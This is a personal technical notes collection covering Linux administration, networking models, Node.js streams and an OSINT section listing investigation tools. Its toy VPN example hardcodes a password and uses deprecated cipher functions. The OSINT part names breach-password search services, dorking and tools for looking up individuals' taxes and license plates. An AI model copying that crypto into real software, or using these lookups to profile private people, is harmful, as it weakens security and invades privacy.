Unused/customizable 5 - Run level 3 + GUI display manager (if installed, so the graph env) 6 - Reboot Based on the run level, more or less scripts will be ran which are located in different places (e.g. Systemd or sysv) inittab (came with sysv) Ubuntu : /etc/rc0.d \u0026hellip; /etc/rc6.d folders with scripts that are ran based on correlating run level. rcS.d us ran for any run level. This is still there for compatibility reasons systemd run levels : Also has scripts System scripts /etc/systemd/system Package Scripts /usr/lib/systemd/system /etc/systemd/system takes precedence over /usr/lib/systemd/systen Uses targets (similar-ish to the other run level style) Run Level - Systemd Target 0 - runlevel0.target, poweroff.target 1 - runlevel1.target, rescue.target 2,4 - runlevel2.target, runlevel4.target, multi-user.target 3 - runlevel3.target, multi-user.target 5 - runlevel5.target, graphical.target 6 - runlevel6.target, reboot.target emergency - emergency.target with init/telinit you can tell what level to run systemctl\nHow you drive/control systemd How you start, stop, restart applications (just like kubectl) E.g. Status sound card : sudo systemctl status sound.target stop sound card : sudo systemctl stop sound.target Status sound card : sudo systemctl status sound.target start sound card : sudo systemctl start sound.target Status sound card : sudo systemctl status sound.target Commands\nps : List active processes ps aux | head : Shows the top processes where you will seee /sbin/init dmesg : Kernel messages logged from the last bootup head : take first n lines tail : take last n lines less : page through a long result man : manual sudo wall : Send a message to anyone logged in/has open shell (like announce a reboot) which : Where is an app running from? Linux Installation and Package Management # Design hard disk layout\n/ : root /usr : user binaries installed /home : /boot : All related to booting /var : Variable data (e.g. system logs \u0026hellip;) /tmp : Everyone on the system can write to Partitions\nDivide storage in multiple pieces Allows dual booting Separation of files Data organization System protection e.g. Separate partition for each user to separate and safeguard When you create a partition you need to mount them to directories. Every path in linux can be mounted to We can mount to : /home /var /tmp /home/nick/blah/ Remember like with Docker. You can have a folder /home/ian/dbdata with data in it. When you mount a partition to /home/ian/dbdata, the data in there will be hidden and overtaken with this mounted partition (like a volume with docker) Once you unmoun the partition from that folder, the original data is again visible and accessible. Swap\nSwap is a partition, used in case the RAM is full, Swap is used Unused pages fo the RAM will be saved in the SWAP partition LVM\nLogical Volume Manager (like Disk Manager windows, on steroids) Allows to split disks into pools (Pools are also known as PE, Physical Extends) Create partitions from pools Can grow or shrink partitions Install a boot manager\nBoot Loader\nBoots a linux system Runs before the OS Can be configured from the operating system common boot loaders : LILO GRUB Legacy GRUB2 Configuring the /boot/grub/grub.cfg results in editing your boot loader logic\nAlthough the above is the auto generated result of /etc/grub.d and /etc/default/grub using grub-mkconfig\ngrub-probe\ngrub-install : To install grub to the MBR of the specified disk (in case that didn\u0026rsquo;t happen yet)\nRevise\nupdate sudo vi /etc/default/grub file run sudo update-grub restart to see changes in action Manage Shared Libraries\nLibraries : So typical libs/packages that bash scripts or actual code can use Key properties Shared Reusable Linking When your application wants to use these libraries, they should be linked to them Static Linking : Library is included in the application (each app has its own copy) Dynamic Linking : Different applications using the exact same copy of the library Update libraries in a single place /etc/ld.so.conf lists the locations of the shared libraries on your system. include statements means it was split into other linked files ldd : ldd prints the shared objects (shared libraries) required by each program or shared object specified on the command line. e.g. ldd /bin/ls Use debian package manager\ndpkg : Debian Package Manager install/upgrade/remove software low level tool (Does not automatically installes dependencies) apt Advanced packaging tool high level tool install/upgrade/remove software handles upgrading of entire system Handle all package dependencies automatically Uses online repositories /etc/apt/sources.list is the list for mirrors of apt and specifics on which repos per mirror to use main : Officially supported software restricted : supported software (not free under completely free license) xenial : current version universe : community maintained software multiverse : Not free software apt-get update : update local package lists apt-get install \u0026lt;name\u0026gt; : Install software apt-get remove \u0026lt;name\u0026gt; : Uninstall software ! does not remove remaining config files, use dpkg --purge \u0026lt;name\u0026gt; for cleanup apt-cache depends \u0026lt;name\u0026gt; : Show what a app depends on apt-cache search \u0026lt;name\u0026gt; : Search for packages with a particular name apt-get upgrade : Upgrade all current installed packages (respecting semver) apt-get dist-upgrade : upgrade everything and remove anything unused wget Download a file to current location\nUse RPM and YUM package manager\nRPM RedHat Package Manager rpm command Low level tools install/upgrade/remove software YUM Yellowdog update/modifier replaced YUP (yellowdog updater) Utilites online repositories manages dependencies Quiz\nHow do you temporarily add a directory to your shared library path? - LD_LIBRARY_PATH GNU and Unix Commands # Devices, filesystems and filesystem hierarchy # Shells, scripting and data management # User Interface and Desktop # Manage user and group accounts and related system files # Essential System Services # Networking fundamentals # Security # "},{"id":57,"href":"/network/","title":"Network","section":"","content":" Networking 101 # Summary of network relevant topics regarding computers.\nGeneral Topics # A protocol stack is the collection of protocols (given protocol for each layer) that is used by a given system. A network architecture is the collection of layers and protocols. In networking you have also the concept of a sender sending more than a receiver can handle (like back pressure with streams). In networking this is often named flow controll. In networking you have often 2 types of delivery datagram: Just a stream of data, no need for guarantee of delivery (eg. a stream, video streaming). Usually have a concept of a \u0026ldquo;connection\u0026rdquo;. confirmed datagram: Sent distinct parts, guaranteed delivery. Usually don\u0026rsquo;t talk about a \u0026ldquo;connection\u0026rdquo;. OSI model was created before protocols, TCP/Ip after protocols. That\u0026rsquo;s why it stuck more and had no \u0026ldquo;flaws\u0026rdquo; for new use cases. Introduction OSI model # OSI: Open Systems Interconnection Model\nStandardizes communication functions of telecommunication/computer systems with standard communication protocols. Original model defines 7 abstraction layers. A layer servers the layer above and served by the layer below. ISO standard Each level has a PDU, Protocol Data Unit (e.g. Data, Package, Segment, Frame, \u0026hellip;) A PDU has a payload (Service Data Unit, SDU) + protocol related header and footer. Some protocols might define \u0026ldquo;sublayers\u0026rdquo; for the benefit of the protocol design. Just a model, nothing in the real world adhere\u0026rsquo;s to it. Communication protocols enable an entity in one host to interact with corresponding entity at the same layer in another host.\nSome layers allow variable length of data, but lower layers might have to adhere to fixed length. These layers will split the data into smaller parts.\nThe 7 Layers\nLayer 1: Physical - Transmission of raw data between devices over a medium. Converts bits to electric/radio or optical signals. Layer 2: Data Link - Node to node transfer. Detects/corrects errors in physical layer. Defines protocol to establish and terminate connections between physical devices + flow control. (e.g. 802.11 Wi-Fi) Layer 3: Network - Functional and procedural means of transferring variable length packets from one node to another in different networks. At this point there is a concept of \u0026ldquo;address\u0026rdquo; for each node and a packet can be \u0026ldquo;routed\u0026rdquo;. At this point the packet does not travel perse between 2 devices that are physically directly connected. More details later. Layer 4: Transport - Functional and procedural means of transferring variable length packets from source to destination while maintaining QoS functions. This is end-to-end at this point. You talk with the target device, not an in between node. Layer 5: Session - Controls (establish, manage and terminate) connections between computers. Provides full-duplex, half-duplex and simplex operation. RPCs usually live on this layer. Layer 6: Presentation - Establish context between application-layer entities. Translates between network and application formats. So translates data into the format that he application layer accepts. Layer can also include compression functions. Layer 7: Application - Layer closest to end user, communicating with the software application. Cross-layer functions: Services not tied to a given layer, may affect multiple layers (e.g. security).\nComparison with TCP/IP model:\nInternet Application Layer: Maps to OSI\u0026rsquo;s Application (#7), Presentation (#6) and Session Layer (#5). TCP/IP Transport Layer: Graceful close functions of OSI Session (#5) and Transport layer (#4). Internet Layer: OSI Network Layer (#3) Link Layer: OSI Data Link Layer (#2) and Phsyical Layer (#1) Notice how OSI Session layer relates to Internet Application and Transport layer of TCP/IP. A layer has a \u0026ldquo;Service\u0026rdquo; which is the primitives/operations that it exposes to the higher level layer using our given layer, see it as the interface. The protocol is rather the rules for a the same layer but between different machines, the peer layers. (e.g. how is the data structured for given layer)\nIntroduction TCP/IP Model # The 4 Layers\nLayer 1: Physical - The model does not specify much about this layer. As long it can serve the upper layer. Layer 2: Network/Internet - The routing logic from end2end across multiple nodes. Connection-agnostic layer. Defines an official packet format and protocol, named IP (internet protocol). Layer 3: Transport - Layer allows peer entities to have conversations with source and target entities. 2 end2end protocols available on this level TCP (Transmission Control Protocol) - Delivery guarantee, reassembled out of order messages. Also does control flow. UDP (User datagram Protocol) - No delivery guarantee, connectionless, stream basically. Also for single request/reply queries. Speed is more important than accuracy. Layer 4: Application - Experiende said that abstractions of session/presentation layers were not necessary. Examples are TELNET, FTP, SMTP, HTTP, DNS, NNTP, \u0026hellip;) Compared to OSI model\nLayer 1: Physical - Encapsulates \u0026ldquo;Physical\u0026rdquo; layer and \u0026ldquo;Data Link\u0026rdquo; layer of ISO Layer 2: Network/Internet - Same as \u0026ldquo;Network\u0026rdquo; layer of ISO Layer 3: Transport - Same as \u0026ldquo;Transport\u0026rdquo; layer of ISO Layer 4: Application - Encapsulates \u0026ldquo;Session\u0026rdquo;, \u0026ldquo;Presentation\u0026rdquo;, and \u0026ldquo;Application\u0026rdquo; layer of ISO The Physical Layer # "},{"id":58,"href":"/nodejs-streams-and-networking/","title":"Nodejs Streams and Networking","section":"","content":" Streams and Networking # These are notes based on the Frontend Masters course by James Holiday (aka Substack). Link here\nNetworking, servers, and clients # Networking and Packets # Servers and clients\nAny networked computer can be a server Aby networked computer can be a client These are roles rather. A payload is often broken up in multiple packets. Which you can receive out of order.\nTCP vs UDP\nTCP : Reliable transport; If no ACK (acknowledged) came from the other end, we RESENT it. UDP : Unreliable transport; Fire and forget, there is no confirmation from the other end if a packet was received. Use case : Streaming audio/video (some use TCP now), games Protocols and Ports # Language that computes programs speak to each other, examples of protocols:\nHTTP - Browse web pages (port 80) HTTPS - Browse web pages with encryption (port 443) SMPT - Send an receive emails (port 25) IMAP, POP3 - Load emails from an inbox IRC - Chat (port 6667) FTP - File transfer (port 21 for control) SSH - Remote shell over an encrypted connection (port 22) SSL - Low-level secure data transfer (used by HTTPS) Most services have (often) one or many default ports. A computer can have many services, ports differentiate between the services on a system. (range 1 - 65535). We can have a service listen to any port, but we have custom, default assignments.\nmysql - 3306 postgresl - 5432 couchdb - 5984 By default, systems can only listen to ports below 1024 as the root user.\nServers and Clients # A server means you are listening for incoming connections. Clients initiate the connections and connects to servers. P2P : This is a third role, aside of client and server. Here clients establish connections directly with other clients. There are no fixes servers. Example is webrtc : Usually use for video and audio chat. Else you get latency if it all goes through a centralized server. Netcat # Plain text server start server: nc -l 5000 start client: nc localhost 5000 Happy chatting HTTP and Headers # HTTP : Hyper Text Transfer Protocol, how web servers and web browsers communicate. HTTP requests begin with a VERB GET - Fetch document POST - Submit a form HEAD - Fetch metadata about a document PUT - Upload a file Headers Key value key: value, colon separated, space not mandatory Example of creating a HTTP conform message $ nc google.com GET / HTTP/1.0 HOST: google.com --\u0026gt; A server might serve multiple domains, or LB. The format is a bit like this plain text snippet, notice the 2 returns before the body starts: VERB PATH HTTPVERSION HEADERS ... BODY ... and the response like HTTPVERSION STATUSCODE STATUSMESSAGE HEADERS ... BODY ... HTTP Post # Taken the following response\nHTTP/1.1 200 OK Date: Mon, 12 Jan 2015 06:37:51 GMT Connection: keep-alive Transfer-Encoding: chunked \u0026lt;- Gonna send body in chunks, send links for chunks. Server doesn\u0026#39;t know in advance how long the response will be. 3 \u0026lt;-- Hex value of the cuncked part oi \u0026lt;-- payload 4 \u0026lt;-- Hex value of the cuncked part ok \u0026lt;-- payload 0 \u0026lt;-- End, finished Curl # $ curl -s http://substack.net \u0026lt;-- Do GET and print body $ curl -i http://substack.net \u0026lt;-- Print body and headers $ curl -I http://substack.net \u0026lt;-- Print only headers # -s gets rid of progress output # Use -X ti set the HTTP VERB and -d for form paramters $ curl -X POST http://substack.net $ curl -X POST http://substack.net -d title=whatever -d date=10000 # You can set headers with the -H flag $ curl http://substack.net -H \u0026#39;Content-Type: application/json\u0026#39; SMTP # Similar to HTTP as it has status codes and such. Like HTTP, you have a first block with \u0026ldquo;headers\u0026rdquo;, so all the metadata, from, to , subject, and then there is a body What we\u0026rsquo;re actually sending. Body is ended with a line with only a . and new line. IRC # Another text based protocol. So HTTP, SMTP and IRC are all plain text protocols that just follow a certain text layout and a port to listen on.\nIRC commands nick - identify as a user user - also identify as user join - join a channel privemsg - send a message to a channel Binary Protocols and Inspecting Protocols # Test based protocols are easy to inspect with a sniffer and such\nWith Binary protocols you can\u0026rsquo;t messages plain text sadly. We need to write programs that unpack the incoming bytes, and pack the outgoing bytes according to given specification.\nExamples of binary\nssh (except from initial greeting) Inspecting protocols\nFor in/out local eth/wifi card Wireshark for GUI tcpdump for CLI $ sudo tcpdump -X --\u0026gt; start listening; $ sudo tcpdump -A --\u0026gt; start listening with other formatting; $ sudo tcpdump 'tcp port 80' '-X -\u0026gt; string contains a query/filter; Streams # Node.js has a handy interface for shuffling data around called streams.\nStream Origins\nWe should have some ways of connecting programs like garden hose screw in another segment when it becomes necessary to massage data in another way. This is the way of IO also. Doug McIlroy, October 11, 1964\nThinks also of how we pipe in *nix systems between programs.\nWhy Streeams?\nWe can compose streaming abstractions We can operate on data chunk by chunk Composition\nJust like how in unix we can pipe commands together, we can pipe streams together\n$ cat file \u0026gt; jq -name \u0026#39;.age\u0026#39;\u0026gt; ... Simple example # a nodejs equivalent what $ cat does.\nconst fs = require(\u0026#39;fs\u0026#39;); fs.createReadStream(process.argv[2]) .pipe(process.stdout); Transform data Example # const fs = require(\u0026#39;fs\u0026#39;); const through = require(\u0026#39;through2\u0026#39;); fs.createReadStream(process.argv[2]) .pipe(through(toUpper)) .pipe(process.stdout); function toUpper(buf, enc, next){ // buf is a binary description of the data // Output should be a buffer or string next(null, buf.toString().toUpperCase()) } Read from a file # const through = require(\u0026#39;through2\u0026#39;); process.stdin .pipe(through(toUpper)) .pipe(process.stdout); function toUpper(buf, enc, next){ // buf is a binary description of the data // Output should be a buffer or string next(null, buf.toString().toUpperCase()) } With Node Core # const { Transform } = require(\u0026#39;stream\u0026#39;); const toUpper = new Transform({ transform: function(buf, enc, next) { next(null, buf.toString().toUpperCase()) } // ... and other hooks }) process.stdin .pipe(toUpper) .pipe(process.stdout); flush is what happens when a stream finishes.\nBit on package through2 # With through there are 2 parameters: write and end. Both are optional.\nthrough(write, end)\nfunction write (bug, enc, next) {} function end () {} Call next() when you\u0026rsquo;re ready for the next chunk. If you don\u0026rsquo;t call next(), your stream will hang!\nCall this.push(VALUE) inside the callback to put VALUE into the stream\u0026rsquo;s output.\nUse a VALUE of NULL to end the stream. This can happen when you need to buffer a certain amount of bytes before you can do something. If you need 100 Byte, you keep doing this.push(VALUE) on each chunk received and just call next() until your buffer size is big enough and take proper actions.\nConcat stream # npm install concat-stream\nConcat-steam buffers up all the data in the stream:\nconst concat = require(\u0026#39;concat-stream\u0026#39;); process.stdin.pipe(concat(function( body) { console.log(body.length); })) You can only write to a concat-stream, You can\u0026rsquo;t read from a concat-stream. Keep in mind that all data will be in memory.\nGOOD TO KNOW : When you are listening to a STDIN, it will keep taking input till it receives a CTRL + D.\nExample of basic HTTP Server with concat stream # const concat = require(\u0026#39;concat-stream\u0026#39;); const through = require(\u0026#39;through2\u0026#39;); const http = require(\u0026#39;http\u0026#39;); const qs = require(\u0026#39;querystring\u0026#39;); const SIZE_LIMIT= 20; var server = http.createServer(function(req, res) { req .pipe(counter()) .pipe(concat({encoding: \u0026#39;string\u0026#39;}, onBody)); function counter() { var size = 0; return through(function(buf, enc, next) { size += buf.length; if(size \u0026gt; SIZE_LIMIT) { next(null, null); }else{ next(null, buf); } }) } function onBody (body){ var params = qs.parse(body); console.log(params); res.end(\u0026#39;ok \u0026#39;); } }); server.listen(5000); Stream Types # Readable streams - Produces data : You can pipe FROM it readable.pipe(A) Key Methods (on each stream you can write to: writeable, transform and duplex) .write(buf) .end() .end(buf) .on('finish', function () {}) (...).pipe(stream) Example const fs = require(\u0026#39;fs\u0026#39;); const w = fs.createWriteStream(\u0026#39;cool.txt\u0026#39;); w.once(\u0026#39;finished\u0026#39;, function() { console.log(\u0026#39;FINISHED\u0026#39;); }); w.write(\u0026#39;Hi \u0026lsquo;); w.write(\u0026lsquo;Wow \u0026lsquo;); w.end();\n* **Writeable streams** - Consumes data: you can pipe TO it * `A.pipe(writeable)` * Key Methods * `stream.pipe(..)` * `stream.once(\u0026#39;end, function () {})` * `stream.read()` * `stream.on(\u0026#39;readable, function () {})` * Example ```js const fs = require(\u0026#39;fs\u0026#39;); const r = fs.createReadStream(process.argv[2]); r.pipe(process.stdout); Modes, streams can be in paused or flowing mode. By default all readable are in paused mode.\nDefault with automatic back pressure Data is consumes as soon chunks are available (no back pressure) Transform streams - Consumes data, producing transformed data\nA.pipe(transform).pipe(B) Readable + writeable stream where input =\u0026gt; transform =\u0026gt; output. Key Methods : All the readable AND writeable methods. Duplex streams - Consumes data separately from producing data. (e.g a bidirectional network stream)\nA.pipe(duplex).pipe(A) -\u0026gt; A and duplex are both gonna be a duplex Readable + writeable stream where input is decoupled from output. Like a telephone! Key Methods : All the readable AND writeable methods. bidirectional connections basically. A duplex stream can pipe in itself. Because read/write is decoupled. Imagine you have one pipe with just two (I and O) lines in it. And you just connect them. Example: Echo Server const net = require(\u0026#39;net\u0026#39;); net.createServer(function(stream) { stream.pipe(stream); // This does not create an infinite loop, just a echo server }).listen(5000); â¶ nc localhost 5000 hi hi there there Ammend Example: Proxy const net = require(\u0026#39;net\u0026#39;); net.createServer(function(stream) { stream .pipe(net.connect(5000, \u0026#39;localhost\u0026#39;)) .pipe(stream) }).listen(5001); â¶ nc localhost 5000 hi hi there there Simple VPN with password # echo.js\nJust output what comes in. const net = require(\u0026#39;net\u0026#39;) net.createServer(function (stream) { stream.pipe(stream) }).listen(5000) vpn.js\nConnects to the echo server. Takes incoming connections Decrypts incoming connection Sends it plain text to the echo server Get\u0026rsquo;s the plain text response from the echo server Encrypts the plain test response Returns the encrypted response const net = require(\u0026#39;net\u0026#39;) const crypto = require(\u0026#39;crypto\u0026#39;) const pump = require(\u0026#39;pump\u0026#39;) const pw = \u0026#39;abc123\u0026#39; net.createServer(function (stream) { pump( stream, crypto.createDecipher(\u0026#39;aes192\u0026#39;,pw), net.connect(5000,\u0026#39;localhost\u0026#39;), crypto.createCipher(\u0026#39;aes192\u0026#39;,pw), stream, function (err) { console.error(err) } ) }).listen(5005) vpn-client.js\nConnect to stdin (Might continue only once a buffer is full) Encrypt the plain text from the std in Send encrypted request it to the vpn server Decrypts the response that came back from the vpn server Writes the decrypted response as the plain text to the stdout const net = require(\u0026#39;net\u0026#39;) const crypto = require(\u0026#39;crypto\u0026#39;) const pw = \u0026#39;abc123\u0026#39; var stream = net.connect(5005,\u0026#39;localhost\u0026#39;) process.stdin .pipe(crypto.createCipher(\u0026#39;aes192\u0026#39;,pw)) .pipe(stream) .pipe(crypto.createDecipher(\u0026#39;aes192\u0026#39;,pw)) .pipe(process.stdout) Object Streams # Normally you can only read and write buffers and strings with streams. However, if you initialize a stream in objectMode, you can use any kind of object (except for null):\n// This can be also done with native modules const through = require(\u0026#39;through2\u0026#39;) const tr = through.obj(function(reow, enc, next) { next(null, (row.n * 1000) + \u0026#39; \u0026#39;) }) tr.pipe(process.stdout) tr.write({n : 5}) tr.write({n : 10}) tr.write({n : 3}) tr.end(); When piping a object stream, the consuming stream should also be able to do objectMode.\nCore Streams # APIs # Many of the APIs in node core provide stream interfaces:\nfs.createReadStream() fs.createWriteStream() process.stdin, process.stdout ps.stdin, ps.stdout, ps.stderr next.connect(), tls.connect() net.createServer(function(stream) {}) tls.createServer(otps, function(stream) {}) Child Process also uses streams # const { spawn } = require(\u0026#39;child_process\u0026#39;); const ps = spawn(\u0026#39;grep\u0026#39;, [\u0026#39;potato\u0026#39;]); ps.stdout.pipe(process.stdout); // We pipe the output of the child process to our stdout ps.stdin.write(\u0026#39;cheese \u0026#39;); ps.stdin.write(\u0026#39;potato \u0026#39;); ps.stdin.end(); HTTP core streams # // We receive a request // req: readable, res:writeable http.createServer((req, res) =\u0026gt; ({})) // We make a request // req: writeable, res:readable var req = http.request((res) =\u0026gt; ({})) Crypto Streams # crypto.createCipher(algo, password) - transform stream to encrypt crypto.createDecipher(algo, password) - transform stream to decrypt crypto.createCipheriv(algo, key, iv) - transform stream to encrypt with iv crypto.createDecipheriv(algo, key, iv) - transform stream to decrypt with iv crypto.createHash(algo) - transform stream to output cryptographic hash crypto.createHash(algo, key) - transform stream to output HMAC digest crypto.createSign(algo) - Writeable stream to sign messages crypto.createVerify(algo) - Writeable stream to verify signatures const { createHash } = require(\u0026#39;crypto\u0026#39;); process.stdin .pipe(createHash(\u0026#39;sha512\u0026#39;, { encoding : \u0026#39;hex\u0026#39; })) .pipe(process.stdout); Don\u0026rsquo;t forget, when you run this, to use CTRL + D to get the hash. It basically says, pull my shit.\nZlib core streams # zlib.createGzip(opts) - transform stream to compress with gzip zlib.createGunzip(opts) - transform stream to uncompress with gzip zlib.createDeflate(opts) - transform stream to compress with deflate zlib.createInflate(opts) - transform stream to uncompress with deflate zlib.createDeflateRaw(opts) - transform stream to compress with raw deflate zlib.createInflateRaw(opts) - transform stream to uncompress with raw deflate zlib.createUnzip(opts) - transform stream to uncompress gzip and deflate Split2 use case # Split input on newlines\nconst split = require(\u0026#39;split2\u0026#39;); const through = require(\u0026#39;through2\u0026#39;); let count = 0; process.stdin .pipe(split()) // This splits on new lines .pipe(through(write, end)); // Now we increase the count per chunk (each being a new line) and log total count function write(next) { count++; next(); } function end() { console.log(count); } Web Socket # Websocket streams # Streaming websockets in node and the browser.\nconst http = require(\u0026#39;http\u0026#39;); const ecstatic = require(\u0026#39;ecstatic\u0026#39;); const through = require(\u0026#39;through2\u0026#39;); var server = http.createServer(ecstatic(__dirname + \u0026#39;/public\u0026#39;) server.listen(3000); const wsock = require(\u0026#39;websocket-stream\u0026#39;); wsock.createServer({server}, function (stream) { // stream is a duplex stream stream.pipe(loud()).pipe(stream); }) function loud () { return through(function(bug, enc, next){ next(null, buf.toString().toUpperCase()); }); } Websocket Node Client # const wsock = require(\u0026#39;websocket-stream\u0026#39;); const stream = wsock(\u0026#39;ws://localhost:500\u0026#39;); process.stdin.pipe(stream).pipe(process.stdout); Stream Modules # Collect Stream # Collect a stream\u0026rsquo;s output into a single buffer. Useful for unit tests. For object streams, collect output into an array of objects.\nconst collect = require(\u0026#39;collect-stream\u0026#39;); const split = require(\u0026#39;split2\u0026#39;); const sp = process.stdin.pipe(split(JSON.parse)) collect(sp, function(err, rows){ if(err) console.error(err); else console.log(rows) }) from2 # Create a readable stream with a pull function. Reminds me a bit of a generator. (Enumeration)\nconst from = require(\u0026#39;from2\u0026#39;); const messages = [\u0026#39;hello\u0026#39;, \u0026#39;world \u0026#39;, null]; from(function(size, next) { next(null, messages.shift()) }).pipe(process.stdout); to2 # Create a writable stream with a write and flush function.\nconst to = require(\u0026#39;to2\u0026#39;); const split = require(\u0026#39;split2\u0026#39;); process.stdin .pipe(split()) .pipe(to(function(buf, next) { console.log(buf.length) next(); })) Duplexify # A logger example\nconst duplexify = require(\u0026#39;duplexify\u0026#39;); const mkdirp = require(\u0026#39;mkdirp\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); module.exports = function (name) { const d = duplexify(); mkdirp(\u0026#39;logs\u0026#39;, function(err) { const w = fs.createWriteStream(\u0026#39;logs/\u0026#39; + name + \u0026#39;.log\u0026#39;); d.setWriteable(w); }) return d; } Usage example\ncont log = require(\u0026#39;./logger.js\u0026#39;); const stream = log(\u0026#39;myname\u0026#39;); stream.write(Date.now() + \u0026#39; \u0026#39;); stream.end(); Errors # Streams are also even emitters. So errors can be caught with error listeners.\nPump # Pump can pipe streams on each other, but gently handles errors.\nconst pump = require(\u0026#39;pump\u0026#39;); pump(stream1, stream2, stream3, function onError() {}); Pumpify # Unlike pump, you get back a stream you can write to and from.\nEnd-of-stream # Reliably detect when a stream is finished. This package is aware of all the obscure ways streams can end.\nconst onend = require(\u0026#39;end-of-stream\u0026#39;); const net = require(\u0026#39;net\u0026#39;); const server = net.createServer(function(stream) { const iv = setInterval(() =\u0026gt; { stream.write(Date.now() + \u0026#39; \u0026#39;); }, 1000); onend(stream, function onEndedOrErrorsOut(){ clearInterval(iv); }) }) server.listen(5000); Remote Procedure Call and Multiplex # RPC-Stream # Call methods defined by a remote endpoint.\nMultiplex # Pack multiple streams into a single stream.\n"},{"id":59,"href":"/osint/","title":"Osint","section":"","content":" OSINT: Open Source Intelligence # Certifications # https://www.giac.org/certifications/open-source-intelligence-gosi/ Methodology # Intelligence Cycle # Planning and Requirements Collection Processing and Evaluation Analysis and Production Dissementation and Consumption Repeat Subject Intelligence # Intelligence about a person and direct metadata (address, name, email, accounts, \u0026hellip;)\nTools # dehashed.com - data breaches and passwords Social Media Intelligence # Social Media of a Subject/business\nNote that especially younger generations might have multiple accounts for various audiences (friends, themselves, a business, \u0026hellip;.)\nMIS/DIS/MAL-information\nMisinfoformation: Misleading or incorrect information that is not knowlingly deceptive. Example: Grandma posts article about vitamines curing cancer. Misinfoformation: Misleading or incorrect information that is knowlingly deceptive/deliberate. Usually entirely fabricated. Example: Mascot from one team posts false information about competing mascot, about being arrested for assault. Malinformation: Based in reality but is purposfully harmfull. It\u0026rsquo;s is based on reality but shared out of context or intent to cause harm. Example: Political party post fake story of immigrant assaulting a native woman to ignite hated. Tools # Telegram Stats Reddit Post Analyzer 1 Reddit Post Analyzer 2 Pro Twitter (Former Tweet Deck) Centre For Information REeslience Snopes: Debunk site Snopes Fact Checks Fact Check.org Verification Handbook: Guide to verify digital content Spot Bot Like Behaviour on Twitter/x: Bot Sentienel Graph Tools For Analysis Neo4j Gephi Foto Forensics Tool 1 Tool 2 Business and Organisational intelligence # Usual data points Corporate/business structure disclosures Parent Subsidary Holding companies Contract disclosures Government Contracts \u0026gt; Usually public by law \u0026gt; You can check if a given organizatio had government contracts Sounds boring, but very juicy details can be found, especially in appendix Technologies, subcontractors used, blueprints, contacts, building specs,\u0026hellip; Financial Records / annual reports Affiliation and relationship disclosures Procurement / supply chain disclosures Innovative / proprietary technology disclosures Business discretions and lawsuits santions / illegal activity Public disclosures Published material disclosures Public companies must submit reports, so that helps with public companies Social media and other public info allows to pivot to subject intelligence Recognizing Oranizational Crimes Guide 1 guide 2 Be informed about sanctions to know if someone is doing shady stuff UN Sanctions ParisMou Sanctions Financial Action Task Force (FATF) - global money laundering and terrorist financing watchdog Non profit are not allowed various things, non profits can be often used to attract funds for good things but in practice do other things that benefit private persons for example. Non profits usually have less oversight, thatâs why theyâre so tempting for fraud. In every country normally non profits have to do some declarations or statements that should be publicly available . Or they might self publish reports to attract trust. Organizations Domain / Site / IP Look at robots.txt of any site for potential attempted hidden stuff Search for a domain, you might find what other sites refer to the site, that can uncover stuff. The content of a site can indicate if the site is fraudulent, just a quick shell, images and text can be analyzed or reverse searched to see if itâs stock or fake, fotoforensics etcâ¦ If content is legit, it can tell alot about partners, customers, org, employees, structure, contacts, social media, â¦ Website metadata Find hidden but public data by google dorking : site:Â tandbergeiendom.no ext:docx | ext:xlsx | ... Use FOCA for screening a site IPs can show connections or shared infrastructure between seemingly unrelated organizations . Remember, a single hosting can run for various companies sites that are unrelated to, rhey just use the same hosting (e.g wordpress). Tools # Facebook Ads - See all current or past ads and who paid them Open Corporates DNB paid alternative to open corporates, but often. Has more data. EDGAR =\u0026gt;. All the public SEC data in US Project On Government Oversight USASpending.gov - US Federal Produrement data Open Tender EU LittleSis - Find connections/network between entities and people Whoxy.com - WHOIS lookup Nslookup.io - IP Lookup The ASN (autonomous system number) is something you can pivot on FOCA fingerprint site DNSLytics Transport Intelligence # \u0026hellip; todo\nTools # Transportation intelligence # \u0026hellip; todo\nWhat is SAR Difference GPS and GNSS AIS-VTS Jamming and spoofing GNSS JAmming GPS erminology: Parts of ships and equipment aboard ships Gloassary of Port and Shipping Terms Inustrial Control System THE GUIDELINES ON CYBER SECURITY ONBOARD SHIPS Military Aircraft Insignia Visual Aircraft Recognition Drone Survival Guide Off the Radar: Private Planes Hidden From Public View What to Know About Air Cargo Handling Airports \u0026amp; Operational Technology: 4 Attack Scenarios How to decode your VIN Tools # Shipspotting Windy Landsat earthobservatory Sentinel Hub EO Browser Soar Satelites Google Earth Marine Traffic Vesselfinder National Vulnerability Database ArcGis AnyTrip - Live rail map Australia OpenRailwayMap Mobility Portal Travel Time Map Airline Call Signs Plane Spotters Flight Radar 24 adsbexchange - World\u0026rsquo;s largest source of unfiltered flight data Flight Aware OpenStreetMap AirPortia Federal Aviation Administration (FAA) FNS NOTAM Search (FAA) Temporary Flight Restrictions List (FAA) Live Air Traffic Fire Information For Resource Management System Airport SCADA Solutions Model Recognition User submitted license plate database License Plate Lookup Licensen Plates Of The World LocaToWeb is a reliable real-time GPS tracker app for Iphone and Android that shares your position to web in real time. Trucking Database] Critical Infrastructure and Industrial intelligence # \u0026hellip; todo\nTools # Financial intelligence # \u0026hellip; todo\nTools # Cryptocurrency intelligence # \u0026hellip; todo\nTools # Non-Fungible Tokens intelligence # \u0026hellip; todo\nTools # Tools - General # Search # Google Bing Yandex Baidu Archives # WayBackMachine Archive.ph Auto Archiver - Archive social media and other online content Workflow # Browser Extension - Instant Data Scraper Alternatives Others # Bellingcat Toolkit GeoSpy https://fakepersongenerator.com Shodan.io Cyberchef (github) Thispersondoesnotexist.com Similarweb.com/top-websites Google.com/advanced Strava.com raebaker.net/resources PIPL https://whatsmyname.app/ @nixintel Sherlock Github https://epieos.com/ weekdays.works Whoxy.com Viewdns.info Emailrep.io (the lower the reputation, the less likely itâs legitimate) Haveibeenpwned.com IntelligenceX (search breaches) Spiderfoot Lexisnexis.com Https://legal.thomsonreuters.com/en/products/clear-investigation-software Sociallinks.io TheOrg - Find the org charts of companies Belliongcat Filename Finder - Show original file names on google maps Norway Specific # PureHelp Finn Skattesjekk.no - Check tax of people anonymskatt - Check tax of people skatteetaten - Check tax of people - not anonymous BrÃ¸nnÃ¸ysundregistrene - Norwayâs central register authority. Contains multiple registers such as the Register of Business Enterprises, the Register of Company Accounts, and the Register of Bankruptcy. Proff - A commercial website using data from the BrÃ¸nnÃ¸ysund Register Centre and other sources to present company overviews. Maybe you can find here if someone owns or runs a business Einnsyn - A centralized service for searching through Norwegian government agenciesâ public records (post journals) Kvartverket - National authority responsible for mapping, property registration, and geographic data. seeiendom - public-facing portal that combines property information from the 